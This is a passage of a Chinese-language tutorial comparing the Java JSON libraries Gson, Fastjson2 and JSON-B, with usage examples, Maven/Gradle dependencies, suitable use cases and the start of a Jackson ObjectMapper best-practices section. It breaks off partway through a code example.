<li><p><strong>对<code>null</code>值的处理比较友好。</strong><br>默认情况下，Gson在序列化时会<strong>忽略<code>null</code>值字段</strong>，这通常是我们期望的行为，可以减小JSON的体积。如果需要将<code>null</code>也序列化，可以通过<code>GsonBuilder</code>轻松配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">userWithNull</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Gson</span> <span class="variable">defaultGson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line"><span class="type">Gson</span> <span class="variable">serializingNullsGson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GsonBuilder</span>().serializeNulls().create();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认行为：忽略null</span></span><br><span class="line">System.out.println(defaultGson.toJson(userWithNull));</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置后：包含null</span></span><br><span class="line">System.out.println(serializingNullsGson.toJson(userWithNull));</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:2,&quot;name&quot;:null&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>扩展性好，支持<code>TypeAdapter</code>进行定制。</strong><br><code>TypeAdapter</code>是Gson的“瑞士军刀”，它类似于Jackson的<code>JsonSerializer</code>&#x2F;<code>JsonDeserializer</code>。通过自定义<code>TypeAdapter</code>，你可以完全接管某个特定类型的序列化和反序列化过程，实现任何复杂的逻辑。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：将一个User对象序列化为 &quot;id-name&quot; 格式的字符串</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTypeAdapter</span> <span class="keyword">extends</span> <span class="title class_">TypeAdapter</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(JsonWriter out, User user)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            out.nullValue();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out.value(user.getId() + <span class="string">&quot;-&quot;</span> + user.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">read</span><span class="params">(JsonReader in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (in.peek() == JsonToken.NULL) &#123;</span><br><span class="line">            in.nextNull();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] parts = in.nextString().split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(Integer.parseInt(parts[<span class="number">0</span>]), parts[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册并使用TypeAdapter</span></span><br><span class="line"><span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GsonBuilder</span>()</span><br><span class="line">                .registerTypeAdapter(User.class, <span class="keyword">new</span> <span class="title class_">UserTypeAdapter</span>())</span><br><span class="line">                .create();</span><br><span class="line"><span class="type">String</span> <span class="variable">customJson</span> <span class="operator">=</span> gson.toJson(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">3</span>, <span class="string">&quot;Eve&quot;</span>));</span><br><span class="line">System.out.println(customJson); <span class="comment">// -&gt; &quot;3-Eve&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-2-3-Maven-Gradle-依赖"><a href="#2-2-3-Maven-Gradle-依赖" class="headerlink" title="2.2.3 Maven&#x2F;Gradle 依赖"></a>2.2.3 Maven&#x2F;Gradle 依赖</h4><ul>
<li><p><strong>Maven</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- For Maven --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新稳定版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Gradle</strong>:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// For Gradle</span></span><br><span class="line">implementation <span class="string">&#x27;com.google.code.gson:gson:2.10.1&#x27;</span> <span class="comment">// 使用最新稳定版</span></span><br></pre></td></tr></table></figure>

<p><em>Gson是自包含的，通常只需要这一个依赖。</em></p>
</li>
</ul>
<hr>
<h4 id="2-2-4-适用场景"><a href="#2-2-4-适用场景" class="headerlink" title="2.2.4 适用场景"></a>2.2.4 适用场景</h4><ul>
<li><strong>中小型项目，追求简洁API和快速开发</strong>：当你的JSON处理需求相对直接，希望用最少的代码完成任务时，Gson是绝佳选择。</li>
<li><strong>Android开发</strong>：由于其轻量、稳定且在Android生态中历史悠久，仍然是许多Android应用的首选。</li>
<li><strong>处理不规范或遗留的JavaBean</strong>：当需要处理没有无参构造函数、没有标准getter&#x2F;setter的Java类时，Gson的灵活性使其比Jackson更容易配置和使用。</li>
<li><strong>作为工具类库的一部分</strong>：由于其API简单且依赖单一，非常适合封装在项目的<code>utils</code>包中，提供通用的JSON处理能力。</li>
</ul>
<hr>
<h3 id="2-3-Fastjson2-Alibaba出品，性能猛兽"><a href="#2-3-Fastjson2-Alibaba出品，性能猛兽" class="headerlink" title="2.3 Fastjson2 (Alibaba出品，性能猛兽)"></a>2.3 Fastjson2 (Alibaba出品，性能猛兽)</h3><h4 id="2-3-1-简介"><a href="#2-3-1-简介" class="headerlink" title="2.3.1 简介"></a>2.3.1 简介</h4><ul>
<li><strong>Fastjson的第二代版本，由阿里巴巴开发，追求极致性能。</strong><br>Fastjson2是阿里巴巴在广受欢迎的Fastjson 1.x 基础上，完全重写的新一代JSON库。其核心目标非常明确：打造业界最快的Java JSON解析和序列化引擎。它通过大量的底层优化（如直接操作<code>byte[]</code>、JIT友好、SIMD指令等）来实现这一目标。</li>
<li><strong>完全重写，安全为本，解决了Fastjson 1.x 中存在的安全漏洞（AutoType）问题。</strong><br>Fastjson 1.x 因其强大的<code>AutoType</code>功能（自动识别并反序列化任意类型）而广受诟病，这导致了一系列严重的反序列化安全漏洞。Fastjson2从设计之初就将安全放在首位：<ul>
<li><strong>默认关闭<code>AutoType</code></strong>：彻底杜绝了1.x中的主要漏洞来源。</li>
<li><strong>提供安全的<code>AutoType</code>机制</strong>：如果确实需要此功能，必须通过配置白名单来显式开启，将风险控制在可预见的范围内。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-3-2-核心特性"><a href="#2-3-2-核心特性" class="headerlink" title="2.3.2 核心特性"></a>2.3.2 核心特性</h4><ul>
<li><p><strong>号称业界最快的JSON库。</strong><br>Fastjson2在多个公开的性能基准测试中都表现出色。其性能优势主要体现在：</p>
<ul>
<li><strong>对<code>byte[]</code>&#x2F;<code>ByteBuffer</code>的极致优化</strong>：能够直接从字节流解析到Java对象，避免了<code>byte[]</code> -&gt; <code>char[]</code> -&gt; <code>String</code> -&gt; <code>POJO</code> 的中间转换开销。</li>
<li><strong>智能的字段匹配算法</strong>：在反序列化时能快速定位JSON key对应的Java字段。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基础用法与1.x非常相似</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Jack&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="type">User</span> <span class="variable">parsedUser</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>同时支持JSON和JSONB（二进制格式）的解析。</strong><br>JSONB是Fastjson2引入的一种二进制JSON格式，类似于Protobuf或MessagePack。</p>
<ul>
<li><strong>优点</strong>：体积更小（尤其是对于数字），解析速度更快（因为它不需要解析文本数字和转义字符）。</li>
<li><strong>用途</strong>：非常适合在内部服务之间进行高性能、低延迟的数据传输。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2</span>, <span class="string">&quot;Rose&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化为JSONB字节数组</span></span><br><span class="line"><span class="type">byte</span>[] jsonbBytes = JSON.toJSONBytes(user, JSONWriter.Feature.JSONB);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从JSONB字节数组反序列化</span></span><br><span class="line"><span class="comment">// 注意：需要传入目标类型</span></span><br><span class="line"><span class="type">User</span> <span class="variable">parsedUser</span> <span class="operator">=</span> JSON.parseObject(jsonbBytes, User.class, JSONReader.Feature.JSONB);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>兼容Fastjson 1.x 的API，方便迁移。</strong><br>为了让庞大的Fastjson 1.x 用户群体能够平滑升级，Fastjson2保留了核心的静态方法API，如<code>JSON.toJSONString()</code>, <code>JSON.parseObject()</code>, <code>JSON.parseArray()</code>。对于大多数简单用例，迁移工作仅仅是修改Maven&#x2F;Gradle依赖中的<code>groupId</code>和<code>artifactId</code>。</p>
</li>
<li><p><strong>提供了强大的<code>JSONObject</code>和<code>JSONArray</code> API，方便进行动态操作。</strong><br>这类似于Jackson的树模型（<code>JsonNode</code>）。当你不想创建POJO，或者需要动态地构建&#x2F;解析JSON时，<code>JSONObject</code>（本质上是<code>Map</code>）和<code>JSONArray</code>（本质上是<code>List</code>）非常好用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动态构建JSON</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">root.put(<span class="string">&quot;id&quot;</span>, <span class="number">101</span>);</span><br><span class="line">root.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;DYNAMIC&quot;</span>);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">details</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">details.put(<span class="string">&quot;active&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">root.put(<span class="string">&quot;details&quot;</span>, details);</span><br><span class="line"><span class="type">String</span> <span class="variable">dynamicJson</span> <span class="operator">=</span> root.toJSONString();</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:101,&quot;type&quot;:&quot;DYNAMIC&quot;,&quot;details&quot;:&#123;&quot;active&quot;:true&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态解析JSON</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">parsedObject</span> <span class="operator">=</span> JSON.parseObject(dynamicJson);</span><br><span class="line"><span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> parsedObject.getIntValue(<span class="string">&quot;id&quot;</span>); <span class="comment">// -&gt; 101</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">active</span> <span class="operator">=</span> parsedObject.getJSONObject(<span class="string">&quot;details&quot;</span>).getBooleanValue(<span class="string">&quot;active&quot;</span>); <span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-3-3-Maven-Gradle-依赖"><a href="#2-3-3-Maven-Gradle-依赖" class="headerlink" title="2.3.3 Maven&#x2F;Gradle 依赖"></a>2.3.3 Maven&#x2F;Gradle 依赖</h4><ul>
<li><p><strong>Maven</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- For Maven --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 强烈建议使用最新的稳定版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Gradle</strong>:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// For Gradle</span></span><br><span class="line">implementation <span class="string">&#x27;com.alibaba.fastjson2:fastjson2:2.0.32&#x27;</span> <span class="comment">// 强烈建议使用最新的稳定版本</span></span><br></pre></td></tr></table></figure>

<p><em>注：Fastjson2内置了对Java 8日期时间、Joda-Time等常用类型的支持，通常无需像Jackson那样额外添加<code>datatype</code>模块。</em></p>
</li>
</ul>
<hr>
<h4 id="2-3-4-适用场景"><a href="#2-3-4-适用场景" class="headerlink" title="2.3.4 适用场景"></a>2.3.4 适用场景</h4><ul>
<li><strong>对性能要求极高的场景</strong>：<ul>
<li><strong>高吞吐量微服务&#x2F;API网关</strong>：在需要每秒处理成千上万次JSON序列化&#x2F;反序列化的场景中，性能提升非常可观。</li>
<li><strong>大数据处理与ETL</strong>：在数据清洗、转换流程中，快速解析海量JSON日志或数据。</li>
<li><strong>实时计算与金融交易</strong>：对延迟要求极为苛刻的系统。</li>
</ul>
</li>
<li><strong>从Fastjson 1.x迁移的项目</strong>：如果你正在使用Fastjson 1.x，升级到Fastjson2是最佳选择，既能获得巨大的性能提升和安全保障，迁移成本又相对较低。</li>
<li><strong>强烈建议新项目使用 Fastjson2 而非 1.x</strong>：鉴于Fastjson 1.x 的历史安全问题和已停止积极维护的状态，所有新项目都不应再考虑使用1.x版本。Fastjson2是其现代、安全、快速的继任者。</li>
</ul>
<hr>
<h3 id="2-4-JSON-B-Jakarta-EE-标准"><a href="#2-4-JSON-B-Jakarta-EE-标准" class="headerlink" title="2.4 JSON-B (Jakarta EE 标准)"></a>2.4 JSON-B (Jakarta EE 标准)</h3><h4 id="2-4-1-简介"><a href="#2-4-1-简介" class="headerlink" title="2.4.1 简介"></a>2.4.1 简介</h4><ul>
<li><p><strong>Java EE 8 &#x2F; Jakarta EE 的官方标准API。</strong><br>JSON-B（Java API for JSON Binding, JSR 367）是官方定义的、用于将Java对象与JSON文档进行绑定的标准。它扮演着与Jackson-databind或Gson相同的<strong>数据绑定</strong>角色。</p>
</li>
<li><p><strong>与JSON-P协同工作。</strong><br>还有一个与之配套的标准叫<strong>JSON-P</strong> (Java API for JSON Processing, JSR 374)。JSON-P负责更底层的操作：</p>
<ul>
<li><strong>树模型</strong> (类似Jackson的<code>JsonNode</code>)</li>
<li><strong>流式API</strong> (类似Jackson的<code>JsonParser</code>)</li>
</ul>
<p>简单来说：<strong>JSON-B 用于POJO绑定，JSON-P 用于动态树和流式处理。</strong> 这两个标准共同构成了Jakarta EE处理JSON的完整解决方案。</p>
</li>
<li><p><strong>定义标准，实现分离。</strong><br>作为一套标准，JSON-B&#x2F;P只定义了接口、注解和行为规范。具体的实现由第三方库提供。</p>
<ul>
<li><strong>JSON-B</strong> 的参考实现是 <strong>Eclipse Yasson</strong>。</li>
<li><strong>JSON-P</strong> 的参考实现是 <strong>Eclipse Parsson</strong>。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-4-2-核心特性"><a href="#2-4-2-核心特性" class="headerlink" title="2.4.2 核心特性"></a>2.4.2 核心特性</h4><ul>
<li><p><strong>标准化，代码不依赖具体实现，便于迁移。</strong><br>这是遵循标准的最大优势。你的业务代码只与<code>jakarta.json.bind.*</code>包交互，而不是<code>com.fasterxml.jackson.*</code>或<code>com.google.gson.*</code>。这意味着：</p>
<ul>
<li><strong>可移植性</strong>：你的应用可以无缝地部署在任何兼容Jakarta EE的服务器上（如WildFly, Open Liberty, Payara），因为服务器会提供标准实现。</li>
<li><strong>避免厂商锁定</strong>：理论上，你可以更换JSON-B的实现库（比如从Yasson换成其他厂商的实现）而无需修改任何业务代码。这类似于使用JDBC API，可以更换不同的数据库驱动。</li>
</ul>
</li>
<li><p><strong>API设计简洁，符合直觉。</strong><br>标准API的设计力求简单和通用。核心入口是<code>Jsonb</code>接口，通过<code>JsonbBuilder</code>创建。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Jsonb实例 (线程安全，可复用)</span></span><br><span class="line"><span class="type">Jsonb</span> <span class="variable">jsonb</span> <span class="operator">=</span> JsonbBuilder.create();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Ada&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> jsonb.toJson(user);</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Ada&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 反序列化</span></span><br><span class="line"><span class="type">User</span> <span class="variable">parsedUser</span> <span class="operator">=</span> jsonb.fromJson(jsonString, User.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>提供标准注解</strong><br>JSON-B也有一套自己的注解，功能上与其他库的注解对等：</p>
<ul>
<li><code>@JsonbProperty(&quot;user_name&quot;)</code>: 对应Jackson的<code>@JsonProperty</code>。</li>
<li><code>@JsonbTransient</code>: 对应Jackson的<code>@JsonIgnore</code>。</li>
<li><code>@JsonbDateFormat(&quot;yyyy-MM-dd&quot;)</code>: 对应Jackson的<code>@JsonFormat</code>。</li>
<li><code>@JsonbNillable</code>: 用于控制<code>null</code>值的序列化。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-4-3-Maven-Gradle-依赖"><a href="#2-4-3-Maven-Gradle-依赖" class="headerlink" title="2.4.3 Maven&#x2F;Gradle 依赖"></a>2.4.3 Maven&#x2F;Gradle 依赖</h4><ul>
<li><p><strong>Maven</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. JSON-B API (The Standard) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.json.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.json.bind-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. JSON-B Implementation (Eclipse Yasson) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.yasson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>yasson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3. JSON-P Implementation (Yasson的依赖, 通常需要一起加入) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.json<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Gradle</strong>:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. JSON-B API (The Standard)</span></span><br><span class="line">implementation <span class="string">&#x27;jakarta.json.bind:jakarta.json.bind-api:3.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. &amp; 3. Runtime Implementation (Yasson and its dependencies)</span></span><br><span class="line">runtimeOnly <span class="string">&#x27;org.eclipse.yasson:yasson:3.0.3&#x27;</span></span><br><span class="line">runtimeOnly <span class="string">&#x27;org.glassfish:jakarta.json:2.0.1&#x27;</span></span><br></pre></td></tr></table></figure>

<p><em><code>runtime</code> scope表示这些实现库只在运行时需要，编译时你的代码只依赖API。</em></p>
</li>
</ul>
<hr>
<h4 id="2-4-4-适用场景"><a href="#2-4-4-适用场景" class="headerlink" title="2.4.4 适用场景"></a>2.4.4 适用场景</h4><ul>
<li><strong>需要部署在Jakarta EE兼容服务器上的应用</strong>：这是最典型的场景。在这些环境中，服务器已经内置了JSON-B&#x2F;P的实现，你甚至可以将依赖的<code>scope</code>设置为<code>provided</code>。</li>
<li><strong>希望编写与具体实现库解耦的代码</strong>：当你开发一个框架或库，不希望强制用户使用特定的JSON库（如Jackson或Gson）时，面向标准编程是最佳实践，可以避免依赖冲突。</li>
<li><strong>追求长期稳定和规范性的企业级项目</strong>：遵循官方标准有助于项目的长期维护和技术演进，降低了对某个特定开源社区兴衰的依赖风险。</li>
</ul>
<hr>
<h2 id="3-核心功能与最佳实践"><a href="#3-核心功能与最佳实践" class="headerlink" title="3. 核心功能与最佳实践"></a>3. 核心功能与最佳实践</h2><p><strong>前置准备：<code>ObjectMapper</code> 和示例 <code>User</code> 类</strong></p>
<p>所有Jackson操作都围绕<code>ObjectMapper</code>类展开。</p>
<p><strong>最佳实践：</strong></p>
<ol>
<li><strong>复用<code>ObjectMapper</code>实例</strong>：<code>ObjectMapper</code>是线程安全的。它的创建成本较高，因此在你的应用中，应该<strong>只创建一个实例并全局复用</strong>。在Spring项目中，你可以直接将其作为Bean注入。在非Spring项目中，可以将其定义为单例或静态常量。</li>
<li><strong>集中配置</strong>：在创建<code>ObjectMapper</code>时进行一次性配置，如注册模块、设置特性等。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：创建一个可复用的、配置好的ObjectMapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JsonUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectMapper MAPPER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        MAPPER = <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">// 1. 注册Java 8日期时间模块，处理LocalDate, LocalDateTime等</span></span><br><span class="line">        MAPPER.registerModule(<span class="keyword">new</span> <span class="title class_">JavaTimeModule</span>());</span><br><span class="line">        <span class="comment">// 2. 忽略在JSON中存在但Java对象不存在的属性，防止反序列化失败</span></span><br><span class="line">        MAPPER.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 3. 序列化时，不把日期写成时间戳</span></span><br><span class="line">        MAPPER.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例中使用的POJO</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> 